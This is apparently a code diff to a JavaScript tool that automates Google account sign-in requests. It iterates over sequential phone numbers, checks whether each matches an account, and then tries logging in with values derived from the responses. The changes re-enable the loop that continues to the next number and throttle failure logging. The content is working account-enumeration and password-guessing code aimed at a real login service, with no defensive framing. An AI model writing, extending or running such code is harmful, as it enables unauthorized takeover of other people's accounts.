@@ -19,6 +19,7 @@ let mReloadPage = false
 
 let mTimeToken = null
 let mMultiPol = 0
+let mStatus = 0
 
 let signIn = 'https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&rip=1&nojavascript=1&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&service=accountsettings'
 
@@ -123,7 +124,6 @@ function checkNumber(number, name, start, runing) {
             try {
                 let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                 if(data[0][1] == 16) {
-                    console.log('Found: '+data[0][4])
                     logInNumber(number, data[0][4].replace(/[^0-9]/g, ''), name, start, temp)
                 } else {
                     checkNumber(number+1, name, start, temp)
@@ -196,7 +196,7 @@ async function logInNumber(number, password, name, start, runing) {
             
             if(!check) {
                 console.log(response.headers)
-                //checkNumber(number+1, name, start, runing)
+                checkNumber(number+1, name, start, runing)
             }
         })
     } else {
@@ -239,7 +239,11 @@ function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, n
                             output = 1
                             passwordTry(password, TL, Identifier, type, null, 0, 2, number, name, start, runing)
                         } else if(loop == 2) {
-                            console.log('Matching Faild')
+                            if(mStatus > 10) {
+                                mStatus = 0
+                                console.log(CODE+number+' Matching Faild')
+                            }
+                            mStatus++
                         }
                     }
                 } else if(data[0][3] == 3) {
